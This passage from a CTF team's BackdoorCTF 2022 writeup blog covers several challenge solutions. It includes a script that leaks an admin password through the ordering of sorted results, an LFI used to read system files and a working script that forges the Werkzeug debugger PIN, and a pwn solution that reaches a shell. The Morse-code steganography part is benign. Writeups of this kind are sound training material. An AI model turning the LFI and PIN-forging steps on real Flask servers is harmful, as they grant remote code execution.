        print(<span style="color:#e6db74">&#34;Request failed with status code:&#34;</span>, response<span style="color:#f92672">.</span>status_code)

    query_params[<span style="color:#e6db74">&#34;order[0][dir]&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;desc&#34;</span>
    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>query_params, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
        data_rev <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;data&#34;</span>]
        
    <span style="color:#66d9ef">else</span>:
        print(<span style="color:#e6db74">&#34;Request failed with status code:&#34;</span>, response<span style="color:#f92672">.</span>status_code)
    a <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]
    b <span style="color:#f92672">=</span> [len(data_rev)]
    j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
        temp_rev_idx <span style="color:#f92672">=</span> get_index_from_list(data_rev,data[a[j]][<span style="color:#e6db74">&#34;name&#34;</span>])
        temp_len <span style="color:#f92672">=</span> len(data_rev[temp_rev_idx:b[j]])
        temp_idx <span style="color:#f92672">=</span> a[j] <span style="color:#f92672">+</span> temp_len
        a<span style="color:#f92672">.</span>append(temp_idx)
        b<span style="color:#f92672">.</span>append(temp_rev_idx)
        j <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        <span style="color:#66d9ef">if</span> temp_idx <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">500</span>:
            <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">for</span> k,c <span style="color:#f92672">in</span> zip(range(<span style="color:#ae81ff">0</span>,len(a)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>),password_charset):
        x <span style="color:#f92672">=</span> range(a[k],a[k<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>])
        <span style="color:#66d9ef">if</span>(admin_index <span style="color:#f92672">in</span> x):
            password <span style="color:#f92672">+=</span> c
            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;password at idx </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
            <span style="color:#66d9ef">break</span>
print(password)
</code></pre></div><p>The output of the script yields
<code>a469ce51db083f27</code></p>
<h3 id="konsolation-prize-11-solves">Konsolation prize (11 solves)<a hidden class="anchor" aria-hidden="true" href="#konsolation-prize-11-solves">#</a></h3>
<p><em>Solved by J4cky, Ja5on</em></p>
<p>Three endpoints were found after some directory enumeration.</p>
<p><img src="/images/2022-12-24-backdoorctf/konsolation-1.png" alt=""></p>
<ul>
<li><code>/admin</code> shows the error debug log, exposing information about this challenge: the backend is Python Flask + Jinja2 + Werkzeug &amp; the endpoint <code>/article</code> takes a GET parameter <code>name</code></li>
<li><code>/console</code> is the Werkzeug debugger console, pin is required</li>
<li><code>/article</code> shows an error message <code>[Errno 2] No such file or directory: 'article'</code></li>
</ul>
<p>From the source code shown in the error debug log <code>&lt;a href='/article?name=article'&gt;</code>, we can correlate with this error message that the server is trying to open the file which is the value of the GET parameter <code>name</code>. Hence there is a LFI and we can make use of this to calculate the pin for the console.
By LFI the Werkzeug’s debug <code>__init__.py</code>, variables needed are:</p>
<ul>
<li><code>username</code> who started this Flask, can be found from <code>/proc/self/environ</code></li>
<li><code>modname</code> which is <code>flask.app</code></li>
<li><code>getattr(app, '__name__', getattr (app .__ class__, '__name__'))</code> which is <code>Flask</code></li>
<li><code>getattr(mod, '__file__', None)</code>  the absolute path of <code>app.py</code> in the flask directory, can be found from the error debug log</li>
<li><code>uuid.getnode()</code> MAC address of the server, first get the device ID from <code>/proc/net/arp</code> (which is <code>eth0</code>), then get the MAC address from <code>/sys/class/net/&lt;device id&gt;/address</code> (i.e., <code>/sys/class/net/eth0/address</code>)</li>
<li><code>get_machine_id()</code> this is the most tricky one as it various according to the version of Werkzeng. For this time, it requires the value of either <code>/etc/machine-id</code> or <code>/proc/sys/kernel/random/boot_id</code> appending with the value after the 3rd slash of the first line in <code>/proc/self/cgroup</code>.
Since <code>/etc/machine-id</code> doesn&rsquo;t exist, we will append the value of <code>/proc/sys/kernel/random/boot_id</code> with the value in <code>/proc/self/cgroup</code> as shown below. (P.S. this value would be changed after the server is restarted)</li>
</ul>
<p><img src="/images/2022-12-24-backdoorctf/konsolation-2.png" alt=""></p>
<p>It should be noted that the hashing algorithm is <code>SHA1</code> instead of <code>MD5</code> (old version).</p>
<p>A sample script for generating the pin:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> hashlib 
<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain

rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>

probably_public_bits <span style="color:#f92672">=</span> [ 
  <span style="color:#e6db74">&#39;r00t-user&#39;</span> , <span style="color:#75715e"># username /proc/self/environ</span>
  <span style="color:#e6db74">&#39;flask.app&#39;</span> , <span style="color:#75715e"># modname</span>
  <span style="color:#e6db74">&#39;Flask&#39;</span>, <span style="color:#75715e"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
  <span style="color:#e6db74">&#39;/usr/local/lib/python3.9/site-packages/flask/app.py&#39;</span> <span style="color:#75715e"># getattr(mod, &#39;__file__&#39;, None)</span>
  ] 

private_bits <span style="color:#f92672">=</span> [ 
  <span style="color:#e6db74">&#39;2485377892355&#39;</span> , <span style="color:#75715e"># /sys/class/net/eth0/address 02:42:ac:11:00:03</span>
  <span style="color:#e6db74">&#39;d5a09294-c0e7-4cf9-a10b-4cdb79f8620cf6583bfe596e2de1979391a591ec7c07363bc587eb59051cf7237b4a5762f39b&#39;</span> <span style="color:#75715e"># /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span>
  ]

h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
<span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> chain(probably_public_bits, private_bits):
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> bit:
        <span style="color:#66d9ef">continue</span>
    <span style="color:#66d9ef">if</span> isinstance(bit, str):
        bit <span style="color:#f92672">=</span> bit<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
    h<span style="color:#f92672">.</span>update(bit)
h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cookiesalt&#39;</span>)

num <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
<span style="color:#66d9ef">if</span> num <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
    h<span style="color:#f92672">.</span>update(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pinsalt&#39;</span>)
    num <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%09d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> int(h<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>))[:<span style="color:#ae81ff">9</span>]

rv <span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>
<span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
    <span style="color:#66d9ef">for</span> group_size <span style="color:#f92672">in</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>:
        <span style="color:#66d9ef">if</span> len(num) <span style="color:#f92672">%</span> group_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            rv <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">.</span>join(num[x:x <span style="color:#f92672">+</span> group_size]<span style="color:#f92672">.</span>rjust(group_size, <span style="color:#e6db74">&#39;0&#39;</span>)
                          <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(num), group_size))
            <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">else</span>:
        rv <span style="color:#f92672">=</span> num

print(rv)
</code></pre></div><p>Finally with the correct pin and the good timing that the console was not locked due to too many failed attempt, we were able to use the interactive console to <em>TRY TO</em> get the hidden flag&hellip; Spent some time checking from different directories with no luck&hellip;then @harrier suggested we may try to search for the files with most recent updated time, so we can use <code>find / -mtime 0</code> and got the result:</p>
<pre tabindex="0"><code>...&lt;snip&gt;...
/usr/share/doc/procps
/usr/share/doc/libprocps8
/usr/share/doc/psmisc
/usr/srv
/usr/srv/secrets
/usr/srv/secrets/y0u_f0und_m3_l0l.txt
/challenge
/challenge/public
/.dockerenv
/src
/src/app
/src/app/__pycache__
/src/app/__pycache__/server.cpython-310.pyc
/src/app/templates
/src/app/templates/main.html
/src/app/templates/article.html
/src/app/templates/base.html
/src/app/server.py
</code></pre><p>Finally we got the flag from <code>/usr/srv/secrets/y0u_f0und_m3_l0l.txt</code>. What a good forensick challenge!</p>
<h2 id="pwn">Pwn<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h2>
<h3 id="babystl-13-solves">babystl (13 solves)<a hidden class="anchor" aria-hidden="true" href="#babystl-13-solves">#</a></h3>
<p><em>Solved by botton</em></p>
<p>Input some garbage randomly then get the flag. Solved within one minute :)</p>
<p><img src="/images/2022-12-24-backdoorctf/babystl-1.png" alt=""></p>
<p><img src="/images/2022-12-24-backdoorctf/babystl-2.png" alt=""></p>
<p>Look back in ida, we would find a function <code>checker</code> that give us the shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> allocator_s<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*&gt;::</span>checker()
{
  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
</span><span style="color:#75715e"></span>
  result <span style="color:#f92672">=</span> _alloc_s;
  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)_alloc_s <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10000</span> )
    <span style="color:#66d9ef">return</span> system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
  <span style="color:#66d9ef">return</span> result;
}
</code></pre></div><p>The <code>_alloc_s</code> is next to the <code>stack_storage</code>,
if we call push message with stack, the program will push a heap address in it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">.bss:<span style="color:#ae81ff">000000000000</span>B2F0 stack_storage   dq <span style="color:#ae81ff">2</span> dup(<span style="color:#f92672">?</span>)             ; DATA XREF: allocator_s<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*&gt;::</span>push_back(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">87</span><span style="color:#960050;background-color:#1e0010">↑</span>o
.bss:<span style="color:#ae81ff">000000000000</span>B2F0                                         ; allocator_s<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*&gt;::</span>emplace_back(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>E<span style="color:#960050;background-color:#1e0010">↑</span>o ...
.bss:<span style="color:#ae81ff">000000000000</span>B300                 public __alloc_s
.bss:<span style="color:#ae81ff">000000000000</span>B300 __alloc_s       dd <span style="color:#f92672">?</span>                    ; DATA XREF: allocator_s<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*&gt;::</span>checker(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">↑</span>r
</code></pre></div><p>Therefore, we can call three times push message and it will push a address in <code>_alloc_s</code>.
Finally, we can call read message to trigger the checker function.</p>
<h2 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h2>
<h3 id="welcome-87-solves">Welcome (87 solves)<a hidden class="anchor" aria-hidden="true" href="#welcome-87-solves">#</a></h3>
<p><em>Solved by fsharp</em></p>
<p>Sometime after the CTF began, a few channels in the BackdoorCTF Discord server had newly pinned messages. One of those pinned messages is from the <code>#random</code> channel and contains the flag:</p>
<p><img src="/images/2022-12-24-backdoorctf/welcome.png" alt=""></p>
<h3 id="lets-blend-in-23-solves">Let&rsquo;s Blend in (23 solves)<a hidden class="anchor" aria-hidden="true" href="#lets-blend-in-23-solves">#</a></h3>
<p><em>Solved by fsharp</em></p>
<p>A picture of a blender is provided. Running <code>binwalk</code> against the image shows that it contains an embedded zip file. After extracting its contents with <code>binwalk -e --dd=.* blender.png</code>, we see that it contains 5 grayscale images, each titled <code>b</code>, <code>d</code>, <code>e</code>, <code>l</code> and <code>n</code>.</p>
<p>Checking the values of pixels for each of the 5 images reveals that they could be interpreted as ASCII characters. The following Python script is written to extract these pixel values and turn them into text:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image

image_names <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;l&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">&#39;d&#39;</span>]
<span style="color:#66d9ef">for</span> image_name <span style="color:#f92672">in</span> image_names:
    image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(image_name, <span style="color:#e6db74">&#39;r&#39;</span>)
    pixel_values <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(image<span style="color:#f92672">.</span>height):
        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(image<span style="color:#f92672">.</span>width):
            coords <span style="color:#f92672">=</span> (x, y)
            pixel_value <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>getpixel(coords)
            pixel_values<span style="color:#f92672">.</span>append(pixel_value)
    print(image_name)
    print(bytes(pixel_values)<span style="color:#f92672">.</span>decode())
    print()
    image<span style="color:#f92672">.</span>close()
</code></pre></div><p>We get the following output:</p>
<pre tabindex="0"><code>b
bpy.ops.object.text_add()
ob=bpy.context.object
ob.data.body = &quot;-... --- .-. -&quot;

l
bpy.ops.object.text_add(location=(5,0,0))
ob=bpy.context.object
ob.data.body = &quot;. - --- ... - .- -&quot;

e
bpy.ops.object.text_add(location=(10,0,0))
ob=bpy.context.object
ob.data.body = &quot;. -.. --- ..- - .&quot;

n
bpy.ops.object.text_add(location=(15,0,0))
ob=bpy.context.object
ob.data.body = &quot;.. --- .-- --&quot;

d
bpy.ops.object.text_add(location=(20,0,0))
ob=bpy.context.object
ob.data.body = &quot;- -. .----. - -... .-.. . -. -..&quot;
</code></pre><p>The text from each image is part of a script that creates objects with text using the Blender Python API. Each object contains Morse code and are placed in specific positions.</p>
<p>Directly translating each piece of Morse code into letters shows something resembling English but with spelling errors. But what if we concatenate each piece of Morse code together without spaces and translate that instead?</p>
<p>Using the <a href="https://morsecode.world/international/translator.html">Morse code translator from morsecode.world</a>, we translate
<code>-... --- .-. -. - --- ... - .- -. -.. --- ..- - ... --- .-- --- -. .----. - -... .-.. . -. -..</code></p>
<p>to get
<code>BORNTOSTANDOUTSOWON'TBLEND</code></p>
<p>So, the flag is <code>flag{BORNTOSTANDOUTSOWON'TBLEND}</code>. And yes, it&rsquo;s case-sensitive, because why not.</p>

</div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
      <li><a href="https://b6a.black/tags/backdoor-ctf/">backdoor-ctf</a></li>
    </ul>
    <nav class="paginav">
      <a class="prev" href="https://b6a.black/posts/2023-01-09-tetctf-pwn01/">
        <span class="title">« Prev Page</span>
        <br>
        <span>TetCTF 2023: pwn01</span>
      </a>
      <a class="next" href="https://b6a.black/posts/2022-12-14-bsides-mumbai/">
        <span class="title">Next Page »</span>
        <br>
        <span>BSides Mumbai CTF 2022 Writeup</span>
      </a>
    </nav>
  </footer>
</article>
<aside class="toc-container">
  <a href="#" style="text-decoration: none; font-weight: 700;">
    BackdoorCTF 2022 Writeup
  </a>
  <div class="js-toc"></div>
</aside>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>

<script type="text/javascript">
  tocbot.init({
    headingSelector: 'h1, h2, h3, h4',
    orderedList: false,
    headingLabelCallback: s => s.substr(0, s.length-1),
    collapseDepth: 2
  });
</script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
<script type="text/javascript">
  (function () {
    const vizPrefix = "language-viz-";
    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
      let engine;
      x.getAttribute("class").split(" ").forEach(function (cls) {
        if (cls.startsWith(vizPrefix)) {
          engine = cls.substr(vizPrefix.length);
        }
      });
      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
      x.parentNode.insertBefore(image.documentElement, x);
      x.style.display = 'none'
      x.parentNode.style.backgroundColor = "white"
    });
  })();
</script>
    </main><footer class="footer">
    <span>&copy; 2024 <a href="https://b6a.black/">Black Bauhinia</a></span>
    <span>&middot;</span>
    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
    <span>&middot;</span>
    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>

<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
mermaid.initialize({
    startOnLoad: true,
    htmlLabels: true,
    securityLevel: "loose",
    theme: 'base',
    themeVariables: {
        background: '#22222c',
        primaryColor: '#33333c',
        primaryTextColor: '#ffe4e1',
    }
});
</script>



<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

</script>

</body>

</html>
